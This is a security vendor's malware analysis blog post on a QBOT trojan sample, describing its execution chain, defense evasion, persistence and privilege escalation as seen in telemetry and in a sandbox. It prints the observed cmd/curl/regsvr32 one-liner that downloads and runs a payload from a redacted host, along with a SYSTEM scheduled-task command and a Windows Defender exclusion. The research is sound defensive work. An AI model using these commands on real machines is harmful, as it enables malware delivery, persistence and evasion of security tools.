max-md:flex-col w-full min-w-0"><div><h2 id="key-takeaways" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Key Takeaways</h2>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4">QBOT is a popular, actively developed, and full-featured trojan</li>
<li class="text-subtler mb-4">Adversary-controlled or owned infrastructure has been observed being used by numerous samples</li>
<li class="text-subtler mb-4">The analyzed sample leverages multiple persistence and defense evasion mechanisms</li>
</ul>
<h2 id="preamble" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Preamble</h2>
<p class="mb-6">Elastic Security Labs has been tracking REF3726, an attack pattern for the QBOT malware family. QBOT, also known as <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot" class="font-medium underline underline-offset-3">QAKBOT</a>, is a prolific modular trojan that has been active since around 2007. QBOT’s loading mechanism makes it an attractive framework to threat actors and ransomware groups and has led to widespread infections of the family; targeting victims across multiple verticals.</p>
<p class="mb-6">This research covers:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4">Execution chain</li>
<li class="text-subtler mb-4">Defense evasion</li>
<li class="text-subtler mb-4">Persistence mechanisms</li>
<li class="text-subtler mb-4">Privilege escalation</li>
<li class="text-subtler mb-4">Network events</li>
<li class="text-subtler mb-4">QBOT configuration extractor</li>
<li class="text-subtler mb-4">Observed tactics and techniques</li>
</ul>
<p class="mb-6">Through this research, from static and dynamic analysis and Elastic telemetry, we uncovered 138 adversary-controlled or owned IP addresses. These IP addresses were linked to our sample and used to identify 339 additional associated malicious files. All artifacts are provided as STIX JSON and Elastic Common Schema (ECS) documents.</p>
<blockquote class="my-7 border-l-4 border-default pl-4 text-lg text-subtler italic">
<p class="mb-6">For information on the QBOT configuration extractor and malware analysis, check out our blog posts detailing this:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><a href="https://www.elastic.co/security-labs/qbot-configuration-extractor" class="font-medium underline underline-offset-3">QBOT Configuration Extractor</a></li>
<li class="text-subtler mb-4"><a href="https://www.elastic.co/security-labs/qbot-malware-analysis" class="font-medium underline underline-offset-3">QBOT Malware Analysis</a></li>
</ul>
</blockquote>
<h2 id="analysis-environment" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Analysis Environment</h2>
<p class="mb-6">We selected a sample for analysis that we could statically and dynamically analyze. This process is commonly used to enrich both types of analysis. For the dynamic analysis, the sample was detonated on a Windows 10 Enterprise VM running the Elastic Endpoint, the Windows and Network Packet Capture Elastic Agent integrations, and an aggressive endpoint logging policy. All events were shipped to our Elastic Cloud cluster and processed through the Elastic Security App. The Elastic Security Endpoint was configured for Alerting and Eventing only (no Prevention). Alerts were generated from Detection Rules in the Security App and directly from the Elastic Security Endpoint default ruleset.</p>
<h2 id="execution-chain" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Execution Chain</h2>
<p class="mb-6">The following section will describe the observed execution chain for the Qbot malware sample. This includes events from Initial Execution to Defense Evasion to Persistence to Privilege Escalation.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr35ltnl6:"><img alt="Full execution chain of the QBOT malware sample" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt5af29f3e529629aa/6a7c820aead8ecb93eba4934/full_process_execution_chain.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Full execution chain of the QBOT malware sample</span></p>
<h3 id="initial-execution" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Initial Execution</h3>
<p class="mb-6">The initial execution of the QBOT sample was observed in Elastic’s telemetry data (derived from @proxylife’s <a href="https://twitter.com/pr0xylife/status/1539601609730170882?s=20&amp;t=G-XR7ibeOO0nWCWajKWTKw" class="font-medium underline underline-offset-3">published research</a> on QBOT).</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">**&quot;C:\Windows\System32\cmd.exe&quot; /q /c echo &#x27;Ft&#x27; &amp;&amp; ping REDACTED[.]com &amp;&amp; MD &quot;\\vyr&quot; &amp;&amp; curl.exe -o \\vyr\v4QpQt.Nqv.e8xO https://REDACTED[.]net/t8EKnIB/C.png &amp;&amp; echo &quot;sxF&quot; &amp;&amp; ping REDACTED[.]com &amp;&amp; regsvr32 &quot;\\vyr\v4QpQt.Nqv.e8xO&quot;**</code></pre><button title="Copy code block" class="absolute top-1 right-1 z-10 cursor-pointer bg-surface-subtlest p-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125  1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0  1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125  1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125  1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"></path></svg></button></div></pre>
<p class="mb-6">Note, that the domains in the initial execution appear to be adversary-controlled, not adversary-owned; because of this, we are redacting them from our reporting.</p>
<p class="mb-6">The initial execution command does the following:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><strong>C:\Windows\System32\cmd.exe</strong> - this executes the Microsoft command interpreter</li>
<li class="text-subtler mb-4"><strong>/q</strong> - this switch of <strong>cmd.exe</strong> is to suppress echo output</li>
<li class="text-subtler mb-4"><strong>/c</strong> - this switch of <strong>cmd.exe</strong> is to pass a specific command string to the command interpreter</li>
<li class="text-subtler mb-4"><strong>echo ‘Ft’</strong> - this prints <strong>‘Ft’</strong> to STDOUT</li>
<li class="text-subtler mb-4"><strong>&amp;&amp;</strong> - if the preceding commands were successful, continue and run the next series of commands</li>
<li class="text-subtler mb-4"><strong>ping REDACTED[.]com</strong> - this performs a network connection test to an external domain using the Ping command</li>
<li class="text-subtler mb-4"><strong>MD “\vyr”</strong> - this creates the <strong>vyr</strong> directory in the root directory ( **C:** )</li>
<li class="text-subtler mb-4"><strong>curl.exe</strong> - this executes the data transfer tool, cURL</li>
<li class="text-subtler mb-4"><strong>-o \vyr\v4QpQt.Nqv.e8xO <code class="border border-default bg-gray-50 px-2 font-mono text-sm">https://REDACTED[.]net/t8EKnIB/C.png</code></strong> - using the cURL tool, download and save the <strong>C.png</strong> file, from <strong>REDACTED[.]net</strong>, to the <strong>vyr</strong> directory with a filename of <strong>v4QpQt.Nqv.e8xO</strong></li>
<li class="text-subtler mb-4"><strong>echo &quot;sxF&quot;</strong> - this prints <strong>“sxF”</strong> to STDOUT</li>
<li class="text-subtler mb-4"><strong>regsvr32 &quot;\vyr\v4QpQt.Nqv.e8xO&quot;</strong> - uses the Microsoft Register Server ( <strong>regsvr32</strong> ) to execute <strong>v4QpQt.Nqv.e8xO</strong></li>
</ul>
<p class="mb-6">The infection was prevented by Elastic Endpoint Security, so while the customer was protected, it stopped our ability to monitor the next steps in the infection. To continue the analysis, we manually detonated the sample in our sandbox.</p>
<h3 id="manually-advancing-execution" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Manually Advancing Execution</h3>
<p class="mb-6">This manual detonation picked up where Elastic Endpoint Security stopped the initial execution outlined above.</p>
<p class="mb-6">To allow the infection to continue, the sample was downloaded to our victim machine and executed manually using the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32" class="font-medium underline underline-offset-3">Microsoft Register Server</a> ( <strong>regsvr32.exe</strong> ). The Register Server is a command-line utility to register and unregister DLLs (and other objects) in the Windows Registry.</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">**regsvr32 -s c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll**</code></pre><button title="Copy code block" class="absolute top-1 right-1 z-10 cursor-pointer bg-surface-subtlest p-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125  1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0  1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125  1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125  1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"></path></svg></button></div></pre>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><strong>regsvr32</strong> - this executes the Microsoft Register Server</li>
<li class="text-subtler mb-4"><strong>-s</strong> - this suppresses messages boxes</li>
</ul>
<p class="mb-6">Now that we have manually executed the Qbot DLL, we can track the execution chain, defense evasion, and persistence techniques using the Elastic Security Solution.</p>
<p class="mb-6">From within the Security Solution, we can expand the malware event generated by the Qbot DLL execution and explore the details. While we manually executed the malware and know much of this information, it is still helpful as an analyst when researching live malware events.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr6tltnl6:"><img alt="Initial alert in the Kibana Security Solution" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt3746fd0ab4608247/6a7c820dbdcff0a2a8c3d0a0/initial_alert_in_security_solution.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Initial alert in the Kibana Security Solution</span></p>
<p class="mb-6">From here we can click on the “Analyze event” button to launch a timeline as a process tree that will show us how the malware progressed and additional contextually relevant information.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr7dltnl6:"><img alt="Viewing the execution chain as a process tree" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt35f0b7b345ee4508/6a7c820f8fc2d012e93e88ee/analyze_event_button.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Viewing the execution chain as a process tree</span></p>
<p class="mb-6">Now that we’re in the Analyzer view, we can continue to step through the QBOT DLL execution chain.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr7tltnl6:"><img alt="Microsoft Registry Server used to execute the QBOT DLL" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt0aac183fc58d20f0/6a7c821273d9bd256c297bee/regsvr32_used_to_execute_dll.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Microsoft Registry Server used to execute the QBOT DLL</span></p>
<p class="mb-6">The Microsoft command interpreter was opened, and then the first <strong>regsvr32.exe</strong> process is started from <strong>C:\Windows\System32.</strong> Next, a child <strong>regsvr32.exe</strong> process is spawned from **C:\Windows\SysWOW64** with the same command-line arguments. The **SysWOW64** folder stores system files used to execute 32-bit processes on a 64-bit Windows operating system. This is expected because the Qbot DLL is a 32-bit file.</p>
<p class="mb-6">Once the DLL is executed by <strong>regsvr32.exe</strong> , it injects itself into the Explorer process.</p>
<p class="mb-6">Next, an <strong>explorer.exe</strong> process is started then immediately self-injects shellcode. In addition to the shellcode injection, we can see 17 file events, 32 network-based events, and 16 registry events observed. We’ll explore those further in the research.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr8tltnl6:"><img alt="QBOT injecting into explorer.exe" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltb21565c5983fc239/6a7c8215da3d0509a1633d99/injects_into_explorer_exe.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">QBOT injecting into explorer.exe</span></p>
<p class="mb-6">Before proceeding, QBOT performs a check to prevent execution on systems that are using the following default system languages:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4">LANG_RUSSIAN (Russia)</li>
<li class="text-subtler mb-4">LANG_BELARUSIAN (Belarus)</li>
<li class="text-subtler mb-4">LANG_KAZAK (Kazakhstan)</li>
<li class="text-subtler mb-4">LANG_ARMENIAN (Armenia)</li>
<li class="text-subtler mb-4">LANG_GEORGIAN (Georgia)</li>
<li class="text-subtler mb-4">LANG_UZBEK (Uzbekistan)</li>
<li class="text-subtler mb-4">LANG_TAJIK (Tajikistan)</li>
<li class="text-subtler mb-4">LANG_TURKMEN (Turkmenistan)</li>
<li class="text-subtler mb-4">LANG_UKRAINIAN (Ukraine)</li>
<li class="text-subtler mb-4">LANG_BOSNIAN (Bosnia)</li>
<li class="text-subtler mb-4">LANG_KYRGYZ (Kyrgyzstan)</li>
</ul>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rr9lltnl6:"><img alt="QBOT checking for specified default system languages" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltbb5968d72c9c0f7b/6a7c82183ce8e2bba1cef709/watchdog_keyboard.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">QBOT checking for specified default system languages</span></p>
<h3 id="defense-evasion" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Defense Evasion</h3>
<p class="mb-6">Once the initial execution chain was completed, we observed attempts at defense evasion to protect the malware and frustrate adversary eviction.</p>
<p class="mb-6">As noted above, Elastic Endpoint Security observed 17 file events from the injected <strong>explorer.exe</strong>. One of the 17 events occurred when the DLL copied itself from its current path to <strong>C:\Users[REDACTED]\AppData\Roaming\Microsoft\Vybgeuye</strong> and named itself <strong>maonyo.dll</strong>. The <strong>maonyo.dll</strong> file is the same file as the original Qbot DLL that was manually executed, verified by the SHA-256 hash.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rralltnl6:"><img alt="Creating of the maonyo.dll file" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt250e324abdfb526f/6a7c821afc63ab2623646f40/maonyo_dll_file_creation.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Creating of the maonyo.dll file</span></p>
<p class="mb-6">This defense evasion tactic will allow the QBOT DLL to continue to be executed even if the original file is deleted.</p>
<p class="mb-6">In addition to creating the <strong>maonyo.dll</strong> file, static malware analysis identified a thread called “watchdog”. The watchdog thread monitors for security instrumentation tools that are stored in a list and compared to running processes.</p>
<p class="mb-6">Every second, the watchdog thread will check to see if any of the running processes matches anything on the list.</p>
<p class="mb-6">The processes that are monitored for are common security analysis tools.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrbtltnl6:"><img alt="Watchdog monitoring for security tooling" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt192776f67c1d9f13/6a7c821d96b5a6c3db875580/watchdog_processes.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Watchdog monitoring for security tooling</span></p>
<p class="mb-6">If any of the monitored processes are observed by the malware, it will proceed with randomly generated IP addresses instead of the hard coded ones in the resources section. If a monitored process is detected, an entry is made to the Windows Registry and the malware does not attempt to connect to the actual network infrastructure.</p>
<p class="mb-6">Of note, the <strong>qak_proxy</strong> process identified in the monitored process list is unknown to us. It is possible that this is for an undisclosed security tool that monitors for QBOT network communications or when QBOT is acting as a proxy (which we did not observe with our sample), but that is speculative in nature.</p>
<p class="mb-6">The static analysis showed that the malware is able to detect running antivirus by checking the list of running processes against known vendors binaries. Depending on the antivirus processes detected, the malware has different behaviors - as an example, if Windows Defender is detected, it add its persistence folder to the Windows Defender exclusion path.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrctltnl6:"><img alt="Watchdog monitoring for antivirus processes" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc08d203b42ebc8de/6a7c82202f00b2e98def8e71/watchdog_av_2.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Watchdog monitoring for antivirus processes</span></p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrd5ltnl6:"><img alt="QBOT adding a Windows Defender exclusion path" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt876ebfb773aa5869/6a7c8223fc63ab4121646f44/registry_defender_exclusion.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">QBOT adding a Windows Defender exclusion path</span></p>
<p class="mb-6">The <strong>reg.exe</strong> command does the following:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><strong>C:\Windows\system32\reg.exe</strong> - Microsoft Registry editor</li>
<li class="text-subtler mb-4"><strong>ADD HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</strong> - folder location in the registry for Windows Defender exclusions</li>
<li class="text-subtler mb-4"><strong>/f</strong> - adds the registry entry without prompting for confirmation</li>
<li class="text-subtler mb-4"><strong>/t REG_DWORD</strong> - specifies the type for the registry entry</li>
<li class="text-subtler mb-4"><strong>/v C:\Users[REDACTED]\AppData\Roaming\Microsoft\Vybgeuye</strong> - specifies the name of the registry entry</li>
<li class="text-subtler mb-4"><strong>/d 0</strong> - specifies the data for the new registry entry</li>
</ul>
<h3 id="persistence" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Persistence</h3>
<p class="mb-6">After the <strong>maonyo.dll</strong> file is created at the random location, **C:\Users[REDACTED]\AppData\Roaming\Microsoft\Vybgeuye** (see the Defense Evasion section) in our example, the <strong>HKEY_USERS\S-1-5-21-1047687853-4161697681-4019128061-1002\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\lnkotdhh</strong> and <strong>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Maonyoeve</strong> Windows Registry paths are created to execute the <strong>maoyno.dll</strong> file every time the user with the SID **S-1-5-21-1047687853-4161697681-4019128061-1002** logs onto the infected host. This SID is for the user that we used when detonating the DLL.</p>
<blockquote class="my-7 border-l-4 border-default pl-4 text-lg text-subtler italic">
<p class="mb-6">While we did not observe QBOT spreading to other users&#x27; SIDs in the Windows Registry during dynamic analysis, static analysis shows that this capability exists.</p>
</blockquote>
<p class="mb-6">We were able to identify the registry path creations using Kibana (see below and in the Defense Evasion section), the security researchers over at Trustwave’s Spider Labs published some <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/decrypting-qakbots-encrypted-registry-keys/" class="font-medium underline underline-offset-3">great research</a> about how to find the location of the created QBOT DLL by decrypting binary data stored at <strong>HKEY_CURRENT_USER\SOFTWARE\Microsoft[random folder]</strong>.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rretltnl6:"><img alt="Logon script added to the Windows Registry" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltcb49bafced621043/6a7c8226bd21986e8e7522a0/registry_logon_script.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Logon script added to the Windows Registry</span></p>
<p class="mb-6">Using the <a href="https://github.com/drole/qakbot-registry-decrypt" class="font-medium underline underline-offset-3">decryption tool</a> that Spider Labs released as part of their research, we were able to manually validate what we were seeing in Kibana.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrfdltnl6:"><img alt="Decrypting binary data added to the Windows Registry" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltfba0f85c08d87d30/6a7c8229448e4e01365bab6e/registry_decrypt_binary.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Decrypting binary data added to the Windows Registry</span></p>
<h3 id="privilege-escalation" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Privilege Escalation</h3>
<p class="mb-6">The privilege escalation mechanism we observed was when the injected <strong>explorer.exe</strong> process spawns <strong>schtasks.exe</strong> and creates a new scheduled task to run as the SYSTEM user.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrg5ltnl6:"><img alt="Scheduled task creation" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6119b6f4c13cbb9f/6a7c822c80ee38d83860d14d/scheduled_task.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Scheduled task creation</span></p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">**C:\Windows\system32\schtasks.exe, /Create, /RU, NT AUTHORITY\SYSTEM, /tn, ayttpnzc, /tr, regsvr32.exe -s &quot;c:\Users\[REDACTED]\Desktop\7611346142\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll&quot;, /SC, ONCE, /Z, /ST, 15:21, /ET, 15:33**</code></pre><button title="Copy code block" class="absolute top-1 right-1 z-10 cursor-pointer bg-surface-subtlest p-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125  1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0  1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125  1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125  1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"></path></svg></button></div></pre>
<p class="mb-6">The initial <strong>schtasks.exe</strong> command does the following:</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><strong>/Create</strong> - creates a scheduled task</li>
<li class="text-subtler mb-4"><strong>/RU</strong> <strong>NT AUTHORITY\SYSTEM</strong> - sets the username and escalates privilege as the <strong>SYSTEM</strong> user</li>
<li class="text-subtler mb-4"><strong>/tn ayttpnzc</strong> - defines the task name</li>
<li class="text-subtler mb-4"><strong>/tr</strong> <strong>regsvr32.exe -s &quot;c:\Users[REDACTED]\Desktop\7611346142\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll</strong> - specifies the task to run</li>
<li class="text-subtler mb-4"><strong>/sc ONCE</strong> - specifies the schedule frequency - once</li>
<li class="text-subtler mb-4"><strong>/Z</strong> - option that marks the task to be deleted after its execution</li>
<li class="text-subtler mb-4"><strong>/ST 15:21</strong> - specifies the task start time (scheduled to start approximately 2-minutes after the scheduled task was created)</li>
<li class="text-subtler mb-4"><strong>/ET 15:33</strong> - time to end the task if not completed</li>
</ul>
<h2 id="network-events" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Network Events</h2>
<p class="mb-6">As we highlighted in the Preamble, there were 32 observed network events generated by the QBOT DLL. In addition to the 32 events that we observed from the execution, we also identified 106 additional hard-coded IP addresses through static analysis. This provided us with a total of 138 IP addresses from our Qbot sample.</p>
<p class="mb-6">Comparing the IP addresses against a corpus of malicious files, we identified 338 additional samples communicating with the same network infrastructure.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrhtltnl6:"><img alt="Network infrastructure observed in multiple samples" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt04fe119d9beb4064/6a7c822f437e0f9e01dd55d3/network_events.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Network infrastructure observed in multiple samples</span></p>
<p class="mb-6">When looking at the distribution of network and malware data points, not all of the samples are related to QBOT. Most of the Win32DLL files are QBOT related, most of the Win32EXE files are associated with the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.emotet" class="font-medium underline underline-offset-3">EMOTET malware family</a>, and the Microsoft Office samples are related to generic malspam attachments.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rridltnl6:"><img alt="Samples by file type" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt4fbda1effe74e721/6a7c8231227b1cef7f5926ac/sample_file_types.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Samples by file type</span></p>
<p class="mb-6">Furthermore, looking at the samples over time, we can see a change in how the network infrastructure was being used. On November 4, 2020, we see a change from predominantly EMOTET and generic samples to the first QBOT sample in our dataset on November 28, 2020. From there, Win32DLL files make up 97.1% of samples first observed after November 2020.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rritltnl6:"><img alt="Collected samples over time" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc3aa55059e037d6f/6a7c8234bdcff04544c3d0a8/all_samples_over_time.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Collected samples over time</span></p>
<h3 id="analyzing-network-events" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Analyzing Network Events</h3>
<p class="mb-6">When looking at the large number of IP addresses collected from both static and dynamic analysis, we wanted to put them into a data analysis platform so that we could visualize them geographically and identify the network owners.</p>
